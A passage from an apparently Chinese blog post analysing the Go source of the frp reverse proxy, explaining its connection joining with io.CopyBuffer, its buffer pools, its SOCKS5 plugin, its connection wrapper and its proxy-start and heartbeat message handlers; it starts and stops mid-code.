&#123;<br>compressionResourceRecycleFn()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>libio.Join(localConn, remote)</code>​</p><p>涉及到的 io 包的函数：</p><ul><li><code>func Copy(dst Writer, src Reader) (written int64, err error)</code>​：从 Reader 中读取数据并写入到 Writer 中，直到无法再从 Reader 中读取到任何数据（EOF）或发生错误，返回被复制的字节数和任何发生的错误信息</li><li><code>func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error)</code>​：用于在 io.Reader 和 io.Writer 之间缓冲复制数据，与 io.Copy 函数不同的是，使用 io.CopyBuffer 可以手动控制缓冲区的大小。如果 buf 为 nil，则分配一个；如果长度为零，则会触发 panic。io.CopyBuffer 避免了 io.Copy 可能出现的大内存使用问题，因为可以使用具有固定大小的缓冲区，所以可以更好地控制内存使用、提高性能</li></ul><p>缓冲写入和读取：避免频繁操作文件、减少访问本地磁盘次数，从而提高效率</p><p>写入流程:</p><ul><li>当写入内容小于缓冲区(<code>buf</code>​)的可用大小时,内容写入缓存区(<code>buf</code>​)；</li><li>当缓冲区(<code>buf</code>​)空间不够时，一次性将缓冲区(<code>buf</code>​)内容写入文件,并清空缓存区(<code>buf</code>​)；</li><li>当写入内容大于缓冲区(<code>buf</code>​)空间时，将内容直接写入文件；</li></ul><p>读取流程:</p><ul><li>当读取内容小于缓冲区(<code>buf</code>​)空间时,从缓存区(<code>buf</code>​)读取；</li><li>当缓冲区(<code>buf</code>​)内容为空时，一次性从文件中读取大小等于缓冲区(<code>buf</code>​)的内容；</li><li>当写入内容大于缓冲区(<code>buf</code>​)空间时，将内容直接写入文件；</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// Join two io.ReadWriteCloser and do some operations.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Join</span><span class="hljs-params">(c1 io.ReadWriteCloser, c2 io.ReadWriteCloser)</span></span> (inCount <span class="hljs-type">int64</span>, outCount <span class="hljs-type">int64</span>, errors []<span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> wait sync.WaitGroup<br>recordErrs := <span class="hljs-built_in">make</span>([]<span class="hljs-type">error</span>, <span class="hljs-number">2</span>)<br>pipe := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(number <span class="hljs-type">int</span>, to io.ReadWriteCloser, from io.ReadWriteCloser, count *<span class="hljs-type">int64</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wait.Done()<br><span class="hljs-keyword">defer</span> to.Close()<br><span class="hljs-keyword">defer</span> from.Close()<br><span class="hljs-comment">// 获取 16k 的缓冲区</span><br>buf := pool.GetBuf(<span class="hljs-number">16</span> * <span class="hljs-number">1024</span>)<br><span class="hljs-keyword">defer</span> pool.PutBuf(buf)<br><span class="hljs-comment">// 从 from 中读取数据并写入到 to 中</span><br>*count, recordErrs[number] = io.CopyBuffer(to, from, buf)<br>&#125;<br><br>wait.Add(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">go</span> pipe(<span class="hljs-number">0</span>, c1, c2, &amp;inCount)<br><span class="hljs-keyword">go</span> pipe(<span class="hljs-number">1</span>, c2, c1, &amp;outCount)<br>wait.Wait()<br><br><span class="hljs-keyword">for</span> _, e := <span class="hljs-keyword">range</span> recordErrs &#123;<br><span class="hljs-keyword">if</span> e != <span class="hljs-literal">nil</span> &#123;<br>errors = <span class="hljs-built_in">append</span>(errors, e)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-comment">// 对象池</span><br><span class="hljs-keyword">var</span> (<br>bufPool16k sync.Pool<br>bufPool5k  sync.Pool<br>bufPool2k  sync.Pool<br>bufPool1k  sync.Pool<br>bufPool    sync.Pool<br>)<br><br><span class="hljs-comment">// 复用</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetBuf</span><span class="hljs-params">(size <span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br><span class="hljs-keyword">var</span> x <span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">16</span>*<span class="hljs-number">1024</span>:<br>x = bufPool16k.Get()<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">5</span>*<span class="hljs-number">1024</span>:<br>x = bufPool5k.Get()<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">2</span>*<span class="hljs-number">1024</span>:<br>x = bufPool2k.Get()<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">1</span>*<span class="hljs-number">1024</span>:<br>x = bufPool1k.Get()<br><span class="hljs-keyword">default</span>:<br>x = bufPool.Get()<br>&#125;<br><br><span class="hljs-keyword">if</span> x == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, size)<br>&#125;<br>buf := x.([]<span class="hljs-type">byte</span>)<br><span class="hljs-comment">// cap 返回切片长度</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">cap</span>(buf) &lt; size &#123;<br><span class="hljs-comment">// 分配空间创建缓冲区</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, size)<br>&#125;<br><span class="hljs-keyword">return</span> buf[:size]<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PutBuf</span><span class="hljs-params">(buf []<span class="hljs-type">byte</span>)</span></span> &#123;<br><span class="hljs-comment">// Put 到对象池中</span><br>size := <span class="hljs-built_in">cap</span>(buf)<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">16</span>*<span class="hljs-number">1024</span>:<br>bufPool16k.Put(buf)<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">5</span>*<span class="hljs-number">1024</span>:<br>bufPool5k.Put(buf)<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">2</span>*<span class="hljs-number">1024</span>:<br>bufPool2k.Put(buf)<br><span class="hljs-keyword">case</span> size &gt;= <span class="hljs-number">1</span>*<span class="hljs-number">1024</span>:<br>bufPool1k.Put(buf)<br><span class="hljs-keyword">default</span>:<br>bufPool.Put(buf)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> Buffer <span class="hljs-keyword">struct</span> &#123;<br>pool sync.Pool<br>&#125;<br></code></pre></td></tr></table></figure><p>插件的处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Go">pxy.proxyPlugin.Handle(pxy.ctx, remote, workConn, &amp;extraInfo)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241206111146-qykv6tv.png?imageSlim" alt="image-20241206111146-qykv6tv.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">//go:build !frps</span><br><br><span class="hljs-keyword">package</span> plugin<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><br>gosocks5 <span class="hljs-string">&quot;github.com/armon/go-socks5&quot;</span><br><br>v1 <span class="hljs-string">&quot;github.com/fatedier/frp/pkg/config/v1&quot;</span><br>netpkg <span class="hljs-string">&quot;github.com/fatedier/frp/pkg/util/net&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>Register(v1.PluginSocks5, NewSocks5Plugin)<br>&#125;<br><br><span class="hljs-keyword">type</span> Socks5Plugin <span class="hljs-keyword">struct</span> &#123;<br>Server *gosocks5.Server<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewSocks5Plugin</span><span class="hljs-params">(options v1.ClientPluginOptions)</span></span> (p Plugin, err <span class="hljs-type">error</span>) &#123;<br>opts := options.(*v1.Socks5PluginOptions)<br><br>cfg := &amp;gosocks5.Config&#123;<br>Logger: log.New(io.Discard, <span class="hljs-string">&quot;&quot;</span>, log.LstdFlags),<br>&#125;<br><span class="hljs-keyword">if</span> opts.Username != <span class="hljs-string">&quot;&quot;</span> || opts.Password != <span class="hljs-string">&quot;&quot;</span> &#123;<br>cfg.Credentials = gosocks5.StaticCredentials(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;opts.Username: opts.Password&#125;)<br>&#125;<br>sp := &amp;Socks5Plugin&#123;&#125;<br>sp.Server, err = gosocks5.New(cfg)<br>p = sp<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 处理远程的 socks 客户端的连接</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sp *Socks5Plugin)</span></span> Handle(_ context.Context, conn io.ReadWriteCloser, realConn net.Conn, _ *ExtraInfo) &#123;<br><span class="hljs-keyword">defer</span> conn.Close()<br><span class="hljs-comment">// 包装远程连接</span><br>wrapConn := netpkg.WrapReadWriteCloserToConn(conn, realConn)<br><span class="hljs-comment">// go-socks5 处理这个远程连接 </span><br>_ = sp.Server.ServeConn(wrapConn)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sp *Socks5Plugin)</span></span> Name() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> v1.PluginSocks5<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sp *Socks5Plugin)</span></span> Close() <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>包装连接，目前不知道时干啥的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Go">wrapConn := netpkg.WrapReadWriteCloserToConn(conn, realConn)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">type</span> WrapReadWriteCloserConn <span class="hljs-keyword">struct</span> &#123;<br>io.ReadWriteCloser<br><br>underConn net.Conn<br><br>remoteAddr net.Addr<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WrapReadWriteCloserToConn</span><span class="hljs-params">(rwc io.ReadWriteCloser, underConn net.Conn)</span></span> *WrapReadWriteCloserConn &#123;<br><span class="hljs-keyword">return</span> &amp;WrapReadWriteCloserConn&#123;<br>ReadWriteCloser: rwc,<br>underConn:       underConn,<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> LocalAddr() net.Addr &#123;<br><span class="hljs-keyword">if</span> conn.underConn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.underConn.LocalAddr()<br>&#125;<br><span class="hljs-keyword">return</span> (*net.TCPAddr)(<span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> SetRemoteAddr(addr net.Addr) &#123;<br>conn.remoteAddr = addr<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> RemoteAddr() net.Addr &#123;<br><span class="hljs-keyword">if</span> conn.remoteAddr != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.remoteAddr<br>&#125;<br><span class="hljs-keyword">if</span> conn.underConn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.underConn.RemoteAddr()<br>&#125;<br><span class="hljs-keyword">return</span> (*net.TCPAddr)(<span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> SetDeadline(t time.Time) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> conn.underConn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.underConn.SetDeadline(t)<br>&#125;<br><span class="hljs-keyword">return</span> &amp;net.OpError&#123;Op: <span class="hljs-string">&quot;set&quot;</span>, Net: <span class="hljs-string">&quot;wrap&quot;</span>, Source: <span class="hljs-literal">nil</span>, Addr: <span class="hljs-literal">nil</span>, Err: errors.New(<span class="hljs-string">&quot;deadline not supported&quot;</span>)&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> SetReadDeadline(t time.Time) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> conn.underConn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.underConn.SetReadDeadline(t)<br>&#125;<br><span class="hljs-keyword">return</span> &amp;net.OpError&#123;Op: <span class="hljs-string">&quot;set&quot;</span>, Net: <span class="hljs-string">&quot;wrap&quot;</span>, Source: <span class="hljs-literal">nil</span>, Addr: <span class="hljs-literal">nil</span>, Err: errors.New(<span class="hljs-string">&quot;deadline not supported&quot;</span>)&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(conn *WrapReadWriteCloserConn)</span></span> SetWriteDeadline(t time.Time) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> conn.underConn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn.underConn.SetWriteDeadline(t)<br>&#125;<br><span class="hljs-keyword">return</span> &amp;net.OpError&#123;Op: <span class="hljs-string">&quot;set&quot;</span>, Net: <span class="hljs-string">&quot;wrap&quot;</span>, Source: <span class="hljs-literal">nil</span>, Addr: <span class="hljs-literal">nil</span>, Err: errors.New(<span class="hljs-string">&quot;deadline not supported&quot;</span>)&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="msg-NewProxyResp"><a href="#msg-NewProxyResp" class="headerlink" title="msg.NewProxyResp"></a>msg.NewProxyResp</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> NewProxyResp <span class="hljs-keyword">struct</span> &#123;<br>ProxyName  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;proxy_name,omitempty&quot;`</span><br>RemoteAddr <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;remote_addr,omitempty&quot;`</span><br>Error      <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;error,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> handleNewProxyResp(m msg.Message) &#123;<br>xl := ctl.xl<br>inMsg := m.(*msg.NewProxyResp)<br><span class="hljs-comment">// Server will return NewProxyResp message to each NewProxy message.</span><br><span class="hljs-comment">// Start a new proxy handler if no error got</span><br>err := ctl.pm.StartProxy(inMsg.ProxyName, inMsg.RemoteAddr, inMsg.Error)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;[%s] start error: %v&quot;</span>, inMsg.ProxyName, err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>xl.Infof(<span class="hljs-string">&quot;[%s] start proxy success&quot;</span>, inMsg.ProxyName)<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *Manager)</span></span> StartProxy(name <span class="hljs-type">string</span>, remoteAddr <span class="hljs-type">string</span>, serverRespErr <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// 判断是否有这个代理</span><br>pm.mu.RLock()<br>pxy, ok := pm.proxies[name]<br>pm.mu.RUnlock()<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;proxy [%s] not found&quot;</span>, name)<br>&#125;<br><span class="hljs-comment">// 设置代理状态</span><br>err := pxy.SetRunningStatus(remoteAddr, serverRespErr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pw *Wrapper)</span></span> SetRunningStatus(remoteAddr <span class="hljs-type">string</span>, respErr <span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>pw.mu.Lock()<br><span class="hljs-keyword">defer</span> pw.mu.Unlock()<br><span class="hljs-comment">// 客户端的代理状态需要是等待开始</span><br><span class="hljs-keyword">if</span> pw.Phase != ProxyPhaseWaitStart &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;status not wait start, ignore start message&quot;</span>)<br>&#125;<br><br>pw.RemoteAddr = remoteAddr<br><span class="hljs-keyword">if</span> respErr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>pw.Phase = ProxyPhaseStartErr<br>pw.Err = respErr<br>pw.lastStartErr = time.Now()<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;%s&quot;</span>, pw.Err)<br>&#125;<br><span class="hljs-comment">// 设置插件</span><br><span class="hljs-keyword">if</span> err := pw.pxy.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>pw.<span class="hljs-built_in">close</span>()<br>pw.Phase = ProxyPhaseStartErr<br>pw.Err = err.Error()<br>pw.lastStartErr = time.Now()<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 设置代理状态为运行中</span><br>pw.Phase = ProxyPhaseRunning<br>pw.Err = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 如果有插件就设置一下插件</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pxy *BaseProxy)</span></span> Run() <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> pxy.baseCfg.Plugin.Type != <span class="hljs-string">&quot;&quot;</span> &#123;<br>p, err := plugin.Create(pxy.baseCfg.Plugin.Type, pxy.baseCfg.Plugin.ClientPluginOptions)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>pxy.proxyPlugin = p<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="msg-Pong"><a href="#msg-Pong" class="headerlink" title="msg.Pong"></a>msg.Pong</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pong <span class="hljs-keyword">struct</span> &#123;<br>Error <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;error,omitempty&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> handlePong(m msg.Message) &#123;<br>xl := ctl.xl<br>inMsg := m.(*msg.Pong)<br><br><span class="hljs-keyword">if</span> inMsg.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;Pong message contains error: %s&quot;</span>, inMsg.Error)<br>ctl.closeSession()<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 存储 Pong 的时间</span><br>ctl.lastPong.Store(time.Now())<br>xl.Debugf(<span class="hljs-string">&quot;receive heartbeat from server&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ctl-msgTransporter"><a href="#ctl-msgTransporter" class="headerlink" title="ctl.msgTransporter"></a>ctl.msgTransporter</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span 